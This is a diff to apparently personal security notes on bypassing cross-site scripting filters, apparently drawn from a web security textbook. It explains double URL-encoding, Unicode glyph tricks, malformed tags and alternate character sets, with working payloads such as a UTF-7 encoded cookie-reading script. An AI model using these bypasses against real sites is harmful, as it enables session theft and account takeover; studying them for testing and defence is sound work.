@@ -148,4 +148,78 @@ The following examples all work on at least one browser:
 <img onerror=a&#0108ert(1) src=a>
 ```
  
- References: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwim7cD06oL5AhWZk4kEHcDGAzMQFnoECAYQAQ&url=http%3A%2F%2Fwww.xss-payloads.com%2F&usg=AOvVaw1-hKbfrHEIcldlShn1bjoC
+**Tag Brackets**
+
+In some situations, by exploiting quirky application or browser behavior, it is possible to use invalid tag brackets and still cause the browser to process the tag in the way the attack requires.
+
+Some applications perform a superfluous URL decode of input after their input filters have been applied, so the following input appearing in a request:
+
+ ```%253cimg%20onerror=alert(1)%20src=a%253e```
+
+is URL-decoded by the application server and passed to the application as:
+
+ ```%3cimg onerror=alert(1) src=a%3e```
+ 
+which does not contain any tag brackets and therefore is not blocked by the input filter. However, the application then performs a second URL decode, so
+the input becomes:
+ 
+```<img onerror=alert(1) src=a>```
+ 
+which is echoed to the user, causing the attack to execute.
+
+**Glyphs**
+ 
+As described in Chapter 2, something similar can happen when an application framework “translates” unusual Unicode characters into their nearest ASCII
+equivalents based on the similarity of their glyphs or phonetics. For example, the following input uses Unicode double-angle quotation marks (%u00AB and
+%u00BB) instead of tag brackets:
+ 
+```«img onerror=alert(1) src=a»```
+ 
+The application’s input fi lters may allow this input because it does not contain any problematic HTML. However, if the application framework translates the quotation marks into tag characters at the point where the input is inserted into a response, the attack succeeds. Numerous applications have been found vulnerable to this kind of attack, which developers may be forgiven for overlooking.
+ 
+Some input filters identify HTML tags by simply matching opening and closing angle brackets, extracting the contents, and comparing this to a blacklist
+of tag names. In this situation, you may be able to bypass the filter by using superfluous brackets, which the browser tolerates:
+
+ ```<<script>alert(1);//<</script>```
+
+In some cases, unexpected behavior in browsers’ HTML parsers can be leveraged to deliver an attack that bypasses an application’s input filters. For example, the following HTML, which uses ECMAScript for XML (E4X) syntax, does not contain a valid opening script tag but nevertheless executes the enclosed script on current versions of Firefox:
+
+ ```<script<{alert(1)}/></script>```
+ 
+TIP In several of the filter bypasses described, the attack results in HTML that is malformed but is nevertheless tolerated by the client browser. Because numerous quite legitimate websites contain HTML that does not strictly comply to the standards, browsers accept HTML that is deviant in all kinds of ways. They effectively fix the errors behind the scenes before the page is rendered. Often, when you are trying to fine-tune an attack in an unusual situation, it can be helpful to view the virtual HTML that the browser constructs out of the server’s actual response. In Firefox, you can use the WebDeveloper tool, which contains a View Generated Source function that performs precisely this task.
+
+ **Character Sets**
+
+ In some situations, you can employ a powerful means of bypassing many types of filters by causing the application to accept a nonstandard encoding of your attack payload. The following examples show some representations of the string 
+ 
+ ```<script>alert(document.cookie)</script>``` 
+ 
+in alternative character sets:
+
+**UTF-7**
+ 
+```
++ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
+```
+ 
+**US-ASCII**
+ 
+```
+BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
+63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
+73 63 72 69 70 74 BE ; script¾
+```
+
+**UTF-16**
+ 
+```
+FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
+3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
+6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
+63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
+2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>. 
+``` 
+ 
+
+ 
+References: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwim7cD06oL5AhWZk4kEHcDGAzMQFnoECAYQAQ&url=http%3A%2F%2Fwww.xss-payloads.com%2F&usg=AOvVaw1-hKbfrHEIcldlShn1bjoC
